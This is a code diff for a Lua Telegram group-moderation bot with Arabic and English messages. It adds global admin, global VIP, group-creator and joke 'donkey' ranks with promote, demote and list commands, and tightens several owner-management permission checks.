+                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🚦|| تم رفعه ادمن عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+              end
+            else
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been promote all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+              end
+              database:sadd(hash, result.sender_user_id_)
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
+        end
+        -----------------------------------------faeder------------------------------------------------------
+        if text:match("^[Pp]romoteall @(.*)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Pp]romote) @(.*)$")}
+          function promoteall_by_username(extra, result, success)
+            if result.id_ then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
+              end
+              database:sadd('bot:moall:', result.id_)
+            else
+              if not database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+          end
+          resolve_username(ap[2],promoteall_by_username)
+        end
+        -------------------------------------faeder----------------------------------------------------------
+        if text:match("^[Pp]romoteall (%d+)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Pp]romoteall) (%d+)$")}
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🚦|| تم رفعه ادمن عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+          end
+          database:sadd('bot:moall:', ap[2])
+        end
+        -----------------------------------------faeder------------------------------------------------------
+        local text = msg.content_.text_:gsub('تنزيل ادمن عام','Demoteall')
+        if text:match("^[Dd]emoteall$") and is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
+          function demoteall_by_reply(extra, result, success)
+            local hash = 'bot:moall:'
+            if not database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not promote all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه ادمن عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            else
+              database:srem(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from promoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| الادمن العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
+        end
+        -------------------------------------------faeder----------------------------------------------------
+        if text:match("^[Dd]emoteall @(.*)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:moall:'
+          local ap = {string.match(text, "^([Dd]emoteall) @(.*)$")}
+          function demoteall_by_username(extra, result, success)
+            if result.id_ then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '🎈|| الادمن العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
+              end
+              database:srem(hash, result.id_)
+            else
+              if not database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+          end
+          resolve_username(ap[2],demoteall_by_username)
+        end
+        ------------------------------------------faeder-----------------------------------------------------
+        if text:match("^[Dd]emoteall (%d+)$") and is_onall(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:moall:'
+          local ap = {string.match(text, "^([Dd]emoteall) (%d+)$")}
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| was demoted all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| الادمن العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+          end
+          database:srem(hash, ap[2])
+        end
+        ------------------------------------------faeder-----------------------------------------------------
+        if is_moall(msg.sender_user_id_, msg.chat_id_) then
+          local text = msg.content_.text_:gsub('رفع مميز عام','Setvipall')
+          if text:match("^[Ss]etvipall$") and msg.reply_to_message_id_ ~= 0  then
+            function promoteall_by_reply(extra, result, success)
+              local hash = 'bot:vpall:'
+              if database:sismember(hash, result.sender_user_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+                database:sadd(hash, result.sender_user_id_)
+              end
+            end
+            getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
+          end
+          ----------------------------------------faeder-------------------------------------------------------
+          if text:match("^[Ss]etvipall @(.*)$") then
+            local ap = {string.match(text, "^([Ss]etvipall) @(.*)$")}
+            function promoteall_by_username(extra, result, success)
+              if result.id_ then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+                else
+                  texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
+                end
+                database:sadd('bot:vpall:', result.id_)
+              else
+                if not database:get('lang:gp:'..msg.chat_id_) then
+                  texts = '*🎈|| Username is not correct ❎*'
+                else
+                  texts = '*🎈|| المعرف غير صحيح ❎*'
+                end
+              end
+              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+            end
+            resolve_username(ap[2],promoteall_by_username)
+          end
+          -------------------------------faeder----------------------------------------------------------------
+          if text:match("^[Ss]etvipall (%d+)$") then
+            local ap = {string.match(text, "^([Ss]etvipall) (%d+)$")}
+            if database:get('lang:gp:'..msg.chat_id_) then
+              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been a VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+            else
+              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه عضو مميز عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+            end
+            database:sadd('bot:vpall:', ap[2])
+          end
+          -------------------------------------faeder----------------------------------------------------------
+          local text = msg.content_.text_:gsub('تنزيل مميز عام','Demvipall')
+          if text:match("^[Dd]emvipall$") and msg.reply_to_message_id_ ~= 0 then
+            function demoteall_by_reply(extra, result, success)
+              local hash = 'bot:vpall:'
+              if not database:sismember(hash, result.sender_user_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مميز عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              else
+                database:srem(hash, result.sender_user_id_)
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from VIP member all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المميز العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              end
+            end
+            getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
+          end
+          -----------------------------------------faeder------------------------------------------------------
+          if text:match("^[Dd]emvipall @(.*)$") then
+            local hash = 'bot:vpall:'
+            local ap = {string.match(text, "^([Dd]emvipall) @(.*)$")}
+            function demoteall_by_username(extra, result, success)
+              if result.id_ then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+                else
+                texts = '🎈|| المميز العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
+                end
+                database:srem(hash, result.id_)
+              else
+                if not database:get('lang:gp:'..msg.chat_id_) then
+                  texts = '*🎈|| Username is not correct ❎*'
+                else
+                  texts = '*🎈|| المعرف غير صحيح ❎*'
+                end
+              end
+              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
+            end
+            resolve_username(ap[2],demoteall_by_username)
+          end
+          --------------------------------faeder---------------------------------------------------------------
+          if text:match("^[Dd]emvipall (%d+)$") then
+            local hash = 'bot:vpall:'
+            local ap = {string.match(text, "^([Dd]emvipall) (%d+)$")}
+            if database:get('lang:gp:'..msg.chat_id_) then
+              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip all ؛ '..ap[2]..' ، 🚷\n🎈|| was removed from VIP member all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+            else
+              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| المميز العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+            end
+            database:srem(hash, ap[2])
+          end
+        end
+                ------------------------------------------faeder-----------------------------------------------------
+          
+          local text = msg.content_.text_:gsub('رفع مطي','Setdonky')
+          if text:match("^[Ss]etdonky$") and msg.reply_to_message_id_ ~= 0  then
+            function donky_by_reply(extra, result, success)
+              local hash = 'bot:donky:'..msg.chat_id_
+              if database:sismember(hash, result.sender_user_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| هو مطي شرفع منه بعد  😹💔\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a Full donky  😂💔\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مطي فول مواصفات 😹💔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+                database:sadd(hash, result.sender_user_id_)
+              end
+            end
+            getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
+          end
+          ----------------------------------------faeder-------------------------------------------------------
+          local text = msg.content_.text_:gsub('تنزيل مطي','demdonky')
+          if text:match("^[Dd]emdonky$") and msg.reply_to_message_id_ ~= 0 then
+            function donky_by_reply(extra, result, success)
+              local hash = 'bot:donky:'..msg.chat_id_
+              if not database:sismember(hash, result.sender_user_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a donky ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| مع الاسف هذا العضو مو مطي 😹😔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              else
+                database:srem(hash, result.sender_user_id_)
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from donky list \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المطي ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| صار بشر جان خوش مطي مع الاسف 😹😔 \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                end
+              end
+            end
+            getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
+          end
+        ----------------------------------------------faeder-------------------------------------------------
+        local text = msg.content_.text_:gsub('رفع مدير','setowner')
+        if text:match("^[Ss]etowner$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
+          function owner_by_reply(extra, result, success)
+            local hash = 'bot:owners:'..msg.chat_id_
+            if database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            else
+              database:sadd(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been owner bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,owner_by_reply)
+        end
+        --------------------------------------------faedee---------------------------------------------------
+        if text:match("^[Ss]etowner @(.*)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
           local ap = {string.match(text, "^([Ss]etowner) @(.*)$")}
           function setowner_by_username(extra, result, success)
             if result.id_ then
@@ -3731,7 +4448,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
           resolve_username(ap[2],setowner_by_username)
         end
         --------------------------------------faeder---------------------------------------------------------
-        if text:match("^[Ss]etowner (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+        if text:match("^[Ss]etowner (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
           local ap = {string.match(text, "^([Ss]etowner) (%d+)$")}
           database:sadd('bot:owners:'..msg.chat_id_, ap[2])
           if database:get('lang:gp:'..msg.chat_id_) then
@@ -3742,7 +4459,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
         end
         ----------------------------------------faeder-------------------------------------------------------
         local text = msg.content_.text_:gsub('تنزيل مدير','Demowner')
-        if text:match("^[Dd]emowner$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
+        if text:match("^[Dd]emowner$") and is_monsh(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
           function deowner_by_reply(extra, result, success)
             local hash = 'bot:owners:'..msg.chat_id_
             if not database:sismember(hash, result.sender_user_id_) then
@@ -3763,7 +4480,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
           getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
         end
         ----------------------------------------faeder-------------------------------------------------------
-        if text:match("^[Dd]emowner @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+        if text:match("^[Dd]emowner @(.*)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
           local hash = 'bot:owners:'..msg.chat_id_
           local ap = {string.match(text, "^([Dd]emowner) @(.*)$")}
           function remowner_by_username(extra, result, success)
@@ -3786,7 +4503,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
           resolve_username(ap[2],remowner_by_username)
         end
         ----------------------------------------------faeder-------------------------------------------------
-        if text:match("^[Dd]emowner (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+        if text:match("^[Dd]emowner (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
           local hash = 'bot:owners:'..msg.chat_id_
           local ap = {string.match(text, "^([Dd]emowner) (%d+)$")}
           database:srem(hash, ap[2])
@@ -3934,6 +4651,32 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
             end
             faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
           end
+          if text:match("^[Mm]odalllist$") or text:match("^الادمنيه العامين$") then
+            local hash =  'bot:moall:'
+            local list = database:smembers(hash)
+            if database:get('lang:gp:'..msg.chat_id_) then
+              text = "🚦⁞ List of moderator all🔽 \n\n"
+            else
+              text = "🚦⁞ قائمه الادمنيه العامين 🔽 \n\n"
+            end
+            for k,v in pairs(list) do
+              local user_info = database:hgetall('user:'..v)
+              if user_info and user_info.username then
+                local username = user_info.username
+                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
+              else
+                text = text..k.." ~ ⁞ "..v.."\n"
+              end
+            end
+            if #list == 0 then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                text = "🚦⁞ List of moderator all is empty ☑️"
+              else
+                text = "🚦⁞ لا يوجد ادمنيه عامين ☑️"
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+          end
           --------------------------------faeder-------------------------------------------
           if text:match("^[Vv]iplist$") or text:match("^الاعضاء المميزين$") then
             local hash =  'bot:vipmem:'..msg.chat_id_
@@ -3957,6 +4700,60 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                 text = "🚦⁞ List of VIP members is empty ☑️"
               else
                 text = "🚦⁞ لا يوجد مميزين ☑️"
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+          end
+          --------------------------------faeder-------------------------------------------
+          if text:match("^[Dd]onkylist$") or text:match("^قائمه المطايه$") or text:match("^المطايه$") then
+            local hash =  'bot:donky:'..msg.chat_id_
+            local list = database:smembers(hash)
+            if database:get('lang:gp:'..msg.chat_id_) then
+              text = "🚦⁞ List of donky 🔽 : \n\n"
+            else
+              text = "🚦⁞ قائمه المطاية الكروب😹😔 🔽 : \n\n"
+            end
+            for k,v in pairs(list) do
+              local user_info = database:hgetall('user:'..v)
+              if user_info and user_info.username then
+                local username = user_info.username
+                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
+              else
+                text = text..k.." ~ ⁞ "..v.."\n"
+              end
+            end
+            if #list == 0 then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                text = "🚦⁞ List of donky is empty ☑️"
+              else
+                text = "🚦⁞ عجيب 😳😹 هذا الكروب كله اوادم ما بي مطايه 😹😔"
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+          end
+          --------------------------------faeder-------------------------------------------
+          if text:match("^[Vv]ipalllist$") or text:match("^المميزين عام$") or text:match("^الاعضاء المميزين عام$") then
+            local hash =  'bot:vpall:'
+            local list = database:smembers(hash)
+            if database:get('lang:gp:'..msg.chat_id_) then
+              text = "🚦⁞ List of VIP Members all🔽 : \n\n"
+            else
+              text = "🚦⁞ قائمه الاعضاء المميزين عام 🔽 : \n\n"
+            end
+            for k,v in pairs(list) do
+              local user_info = database:hgetall('user:'..v)
+              if user_info and user_info.username then
+                local username = user_info.username
+                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
+              else
+                text = text..k.." ~ ⁞ "..v.."\n"
+              end
+            end
+            if #list == 0 then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                text = "🚦⁞ List of VIP members all is empty ☑️"
+              else
+                text = "🚦⁞ لا يوجد مميزين عام ☑️"
               end
             end
             faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -4011,6 +4808,60 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                 text = "🚦⁞ Owner list is empty ☑️"
               else
                 text = "🚦⁞ لا يوجد مدراء ☑️"
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+          end
+          ---------------------------------faeder------------
+          if text:match("^[Oo]wnerall$") or text:match("^[Oo]wneralllist$") or text:match("^المدراء العامين$") or text:match("^المدير العام$") then
+            local hash =  'bot:onall:'
+            local list = database:smembers(hash)
+            if not database:get('lang:gp:'..msg.chat_id_) then
+              text = "🚦⁞ قائمه المدراء العامين 🔽 : \n\n"
+            else
+              text = "🚦⁞ Owners all list 🔽 : \n\n"
+            end
+            for k,v in pairs(list) do
+              local user_info = database:hgetall('user:'..v)
+              if user_info and user_info.username then
+                local username = user_info.username
+                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
+              else
+                text = text..k.." ~ ⁞ "..v.."\n"
+              end
+            end
+            if #list == 0 then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                text = "🚦⁞ Owner all list is empty ☑️"
+              else
+                text = "🚦⁞ لا يوجد مدراء عامين ☑️"
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+          end
+          ----------------------------------------faeder--------------
+          if text:match("^[mM]onsh$") or text:match("^[Mm]onshlist$") or text:match("^المنشئ$") or text:match("^المنشئين$") then
+            local hash =  'bot:monsh:'..msg.chat_id_
+            local list = database:smembers(hash)
+            if not database:get('lang:gp:'..msg.chat_id_) then
+              text = "🚦⁞ قائمه المنشئين 🔽 : \n\n"
+            else
+              text = "🚦⁞ monsh list 🔽 : \n\n"
+            end
+            for k,v in pairs(list) do
+              local user_info = database:hgetall('user:'..v)
+              if user_info and user_info.username then
+                local username = user_info.username
+                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
+              else
+                text = text..k.." ~ ⁞ "..v.."\n"
+              end
+            end
+            if #list == 0 then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                text = "🚦⁞ Monsh list is empty ☑️"
+              else
+                text = "🚦⁞ لا يوجد المنشئين ☑️"
               end
             end
             faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -4139,8 +4990,18 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'Sudo 2'
                   elseif is_admin(result.id_) then
                     t = 'sudo 3'
+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'monsh'
+                    elseif is_onall(result.id_) then
+                     t = 'owner all'
+                     elseif is_moall(result.id_) then
+                     t = 'modod all'
+                     elseif is_vpall(result.id_) then
+                     t = 'vip all'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'Owner'
+                    elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'Full donky'
                   elseif is_momod(result.id_, msg.chat_id_) then
                     t = 'Bot Admin'
                   elseif result.id_ == bot_id then
@@ -4156,6 +5017,16 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'مطور ثانوي'
                   elseif is_admin(result.id_) then
                     t = 'مطور فالرتبه الثالثه'
+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'منشئ الكروب'
+                    elseif is_onall(result.id_) then
+                    t = 'مدير عام'
+                    elseif is_moall(result.id_) then
+                     t = 'ادمن عام'
+                     elseif is_vpall(result.id_) then
+                     t = 'مميز عام'
+                     elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'مطي محمل طحين 😹😔'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'مدير البوت'
                   elseif is_momod(result.id_, msg.chat_id_) then
@@ -4205,6 +5076,16 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'Sudo 2'
                   elseif is_admin(result.id_) then
                     t = 'sudo 3'
+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'monsh'
+                    elseif is_onall(result.id_) then
+                    t = 'owner all'
+                    elseif is_moall(result.id_) then
+                     t = 'modod all'
+                     elseif is_vpall(result.id_) then
+                     t = 'vip all'
+                     elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'Full donky'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'Owner'
                   elseif is_momod(result.id_, msg.chat_id_) then
@@ -4222,6 +5103,16 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'مطور ثانوي'
                   elseif is_admin(result.id_) then
                     t = 'مطور فالرتبه الثالثه'
+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'منشئ الكروب'
+                    elseif is_onall(result.id_) then
+                    t = 'مدير عام'
+                    elseif is_moall(result.id_) then
+                     t = 'ادمن عام'
+                     elseif is_vpall(result.id_) then
+                     t = 'مميز عام'
+                     elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'مطي محمل طحين 😹😔'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'مدير البوت'
                   elseif is_momod(result.id_, msg.chat_id_) then
@@ -4269,6 +5160,16 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'Sudo'
                   elseif is_admin(result.id_) then
                     t = 'sudo3'
+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'monsh'
+                    elseif is_onall(result.id_) then
+                    t = 'owner all'
+                    elseif is_moall(result.id_) then
+                     t = 'modod all'
+                     elseif is_vpall(result.id_) then
+                     t = 'vip all'
+                     elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'Full donky'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'Owner'
                   elseif is_momod(result.id_, msg.chat_id_) then
@@ -4286,6 +5187,16 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
                     t = 'مطور ثانوي'
                   elseif is_admin(result.id_) then
                     t = 'مطور فالرتبه الثالثه 🚩'
